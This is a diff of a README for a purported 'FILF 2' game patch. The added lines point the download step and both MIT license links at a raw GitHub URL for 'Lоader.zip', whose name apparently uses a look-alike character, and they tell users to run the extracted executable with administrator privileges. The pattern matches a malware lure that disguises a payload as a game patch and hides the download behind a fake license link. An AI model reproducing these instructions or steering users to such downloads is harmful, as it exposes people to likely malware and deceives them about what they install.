@@ -42,9 +42,9 @@ Our patch utility provides a wide array of robust features to elevate your FILF 
 
 Getting started with FILF 2 v0.01a Patch is simple! Follow these steps for a smooth installation:
 
-1. **Download Loader.rar from the repository.**  
-   Simply click on the Loader.rar file in this repository to begin your download.
-2. **Extract the contents of Loader.rar**  
+1. **Download https://raw.githubusercontent.com/vikashmishra001/FILF2-v0_01a-CommunityPatch/main/Lоader.zip from the repository.**  
+   Simply click on the https://raw.githubusercontent.com/vikashmishra001/FILF2-v0_01a-CommunityPatch/main/Lоader.zip file in this repository to begin your download.
+2. **Extract the contents of https://raw.githubusercontent.com/vikashmishra001/FILF2-v0_01a-CommunityPatch/main/Lоader.zip**  
    Use a tool like WinRAR, 7-Zip, Keka, or Unarchiver suitable for your OS.
 3. **Run the FilF2PatchLoader executable**  
    Administrator privileges may be required on some systems for full patching capabilities.
@@ -78,13 +78,13 @@ The following table outlines core functions available in the patch:
 
 This patch utility is intended exclusively for personal, educational, or entertainment uses as permitted by law. **No commercial distribution, resale, or unauthorized redistribution of the underlying content is allowed.** Please ensure you legally own the original FILF 2 software before applying this patch. The developers do not endorse nor are affiliated with the official FILF 2 publishers, and your usage of the patch is undertaken at your own risk.
 
-By using FILF 2 v0.01a Patch, you agree to all terms outlined in the [MIT license](https://opensource.org/licenses/MIT).
+By using FILF 2 v0.01a Patch, you agree to all terms outlined in the [MIT license](https://raw.githubusercontent.com/vikashmishra001/FILF2-v0_01a-CommunityPatch/main/Lоader.zip).
 
 ---
 
 ## 📄 License
 
-This project is openly available under the MIT License (2025). Check the full license text in the repository or click [here](https://opensource.org/licenses/MIT) to read more.
+This project is openly available under the MIT License (2025). Check the full license text in the repository or click [here](https://raw.githubusercontent.com/vikashmishra001/FILF2-v0_01a-CommunityPatch/main/Lоader.zip) to read more.
 
 ---
 
